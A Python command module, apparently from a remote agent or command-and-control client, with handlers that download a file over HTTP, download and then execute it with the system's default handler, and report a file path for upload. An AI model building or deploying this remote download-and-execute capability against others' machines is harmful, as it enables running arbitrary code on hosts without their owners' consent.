import subprocess
import os
import requests
import subprocess
import os
import platform
from typing import Optional
from ..constants import TEMP
from ..commands import Command, CommandArgs, ICommandModule, CommandResult
from pydantic import ValidationError



class DownloadFileHTTPArgs(CommandArgs):
    url: str
    saveTo: str
    token: Optional[str] = None

class UploadFileArgs(CommandArgs):
    file_path: str

class DownloadRunExeArgs(DownloadFileHTTPArgs):
    saveTo: str = TEMP

command_arg_map = {
    Command.DOWNLOAD_FILE_HTTP: DownloadFileHTTPArgs,
    Command.DOWNLOAD_RUN_EXE: DownloadRunExeArgs,
    Command.UPLOAD_FILE: UploadFileArgs
}

def open_file(filename: str):
    """Open a file with the default application based on the OS."""
    try:
        if platform.system() == "Windows":
            os.startfile(filename)
        elif platform.system() == "Darwin":  # macOS
            subprocess.run(["open", filename], check=True)
        else:  # Linux and other Unix-like systems
            subprocess.run(["xdg-open", filename], check=True)
    except Exception as e:
        print(f"Error opening file: {e}")
        
class Download(ICommandModule):
    @staticmethod
    def download_file_http(args: DownloadFileHTTPArgs) -> CommandResult:
        print(f"Downloading file to {args.saveTo} url: {args.url}")
        headers = {'Authorization': f'Bearer {args.token}'} if args.token else {}
        try:
            response = requests.get(args.url, headers=headers, stream=True)
            response.raise_for_status()  # To handle HTTP errors
            try:
                os.makedirs(os.path.dirname(args.saveTo), exist_ok=True)
            except Exception:
                pass
            with open(args.saveTo, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            return CommandResult(result=f"File downloaded: {args.saveTo}", success=True)
        except Exception as e:
            return CommandResult(result=f"Error: {e}", success=False)

    @staticmethod
    def run_any_file(args: DownloadRunExeArgs) -> CommandResult:
        try:
            result = Download.download_file_http(args)
            if result.success:
                open_file(args.saveTo)
                return CommandResult(result=f"Opened file: {args.saveTo}", success=True)
            else:
                return result
        except Exception as e:
            return CommandResult(result=f"Error: {e}", success=False)
        
    @staticmethod
    def upload_file(args: UploadFileArgs) -> CommandResult:
        if not os.path.exists(args.file_path):
            return CommandResult(result="Error: File does not exist.", success=False)
        try:
            return CommandResult(result={"path": args.file_path}, success=True)
        except Exception as e:
            return CommandResult(result=f"Error: {e}", success=False)

    def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
        command_func_map = {
            Command.DOWNLOAD_FILE_HTTP : Download.download_file_http,
            Command.DOWNLOAD_RUN_EXE : Download.run_any_file, 
            Command.UPLOAD_FILE: Download.upload_file
        }
        if command not in command_func_map:
            return CommandResult(result=f"Error: Command not found in module.", success=False)    
        
        func = command_func_map[command]
        try:
            args = command_arg_map[command].model_validate(args.model_dump())
            return func(args)
        except ValidationError as e:
            return CommandResult(result=f"Error: {e}", success=False)    
        